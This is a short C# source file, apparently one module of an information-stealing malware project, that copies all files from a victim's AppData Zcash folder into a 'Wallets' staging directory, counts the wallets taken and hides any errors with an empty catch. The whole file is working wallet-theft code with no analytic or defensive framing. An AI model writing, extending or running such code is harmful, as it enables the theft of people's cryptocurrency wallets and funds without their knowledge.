using System.IO;

namespace exos;

internal class Zcash
{
	public static int count = 0;

	public static string ZcashDir = "\\Wallets\\Zcash\\";

	public static void ZecwalletStr(string directorypath)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Helper.AppData + "\\Zcash\\").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(directorypath + ZcashDir);
				fileInfo.CopyTo(directorypath + ZcashDir + fileInfo.Name);
			}
			Counting.Wallets++;
		}
		catch
		{
		}
	}
}
